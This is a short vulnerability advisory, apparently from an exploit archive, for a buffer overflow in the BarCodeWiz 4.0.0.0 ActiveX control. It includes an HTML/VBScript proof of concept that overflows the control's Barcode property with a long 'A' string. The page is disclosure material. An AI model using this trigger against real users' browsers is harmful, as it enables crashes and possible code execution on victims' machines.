@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/54701/info
+
+BarCodeWiz ActiveX control is prone to a buffer-overflow vulnerability because it fails to sufficiently bounds-check user-supplied input.
+
+An attacker may exploit this issue by enticing victims into opening a malicious webpage or HTML email that invokes the affected control.
+
+Successful exploits will allow attackers to execute arbitrary code within the context of the affected application (typically Internet Explorer) that uses the ActiveX control. Failed exploit attempts will result in a denial-of-service condition.
+
+BarCodeWiz 4.0.0.0 is vulnerable to this issue; other versions may be affected as well. 
+
+<html>
+Exploit
+<object classid='clsid:CD3B09F1-26FB-41CD-B3F2-E178DFD3BCC6' id='poc'
+/></object>
+<script language='vbscript'>
+targetFile = "C:\Program Files (x86)\BarCodeWiz ActiveX
+Trial\DLL\BarcodeWiz.dll"
+prototype  = "Property Let Barcode As String"
+memberName = "Barcode"
+progid     = "BARCODEWIZLib.BarCodeWiz"
+argCount   = 1
+arg1=String(14356, "A")
+poc.Barcode = arg1
+</script>
